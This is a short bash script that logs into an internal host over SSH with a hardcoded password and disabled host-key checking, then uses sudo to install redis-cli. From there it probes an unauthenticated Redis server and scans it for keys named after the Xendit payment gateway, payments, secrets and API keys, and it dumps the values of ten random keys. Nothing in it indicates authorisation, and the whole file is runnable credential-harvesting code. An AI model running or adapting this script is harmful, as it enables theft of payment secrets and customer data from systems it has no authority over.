#!/bin/bash
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

/usr/bin/sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 user@10.13.16.196 bash << 'REMOTECMD'
echo "=== REDIS ACCESS CHECK ==="
# Check if redis-cli exists
which redis-cli 2>&1

# Install if not present
if ! which redis-cli >/dev/null 2>&1; then
  echo "Installing redis-tools..."
  echo kutul0nc4t | sudo -S apt-get install -y redis-tools 2>&1 | tail -3
fi

echo "=== REDIS PING ==="
redis-cli -h 10.13.16.156 -p 6379 ping 2>&1

echo "=== REDIS DBSIZE ==="
redis-cli -h 10.13.16.156 -p 6379 dbsize 2>&1

echo "=== SCAN XENDIT/XND ==="
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*xendit*' 2>/dev/null | head -30
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*xnd*' 2>/dev/null | head -30
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*payment*' 2>/dev/null | head -30
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*secret*' 2>/dev/null | head -30
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*apikey*' 2>/dev/null | head -30
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*api_key*' 2>/dev/null | head -30

echo "=== REDIS INFO KEYSPACE ==="
redis-cli -h 10.13.16.156 -p 6379 info keyspace 2>&1

echo "=== RANDOM 10 KEYS + VALUES ==="
for i in $(seq 1 10); do
  KEY=$(redis-cli -h 10.13.16.156 -p 6379 randomkey 2>/dev/null)
  TYPE=$(redis-cli -h 10.13.16.156 -p 6379 type "$KEY" 2>/dev/null)
  TTL=$(redis-cli -h 10.13.16.156 -p 6379 ttl "$KEY" 2>/dev/null)
  echo "[$i] KEY=$KEY TYPE=$TYPE TTL=$TTL"
  if [ "$TYPE" = "string" ]; then
    VAL=$(redis-cli -h 10.13.16.156 -p 6379 get "$KEY" 2>/dev/null)
    echo "    VAL=${VAL:0:300}"
  elif [ "$TYPE" = "hash" ]; then
    redis-cli -h 10.13.16.156 -p 6379 hgetall "$KEY" 2>/dev/null | head -10
  fi
done

echo "=== DONE ==="
REMOTECMD
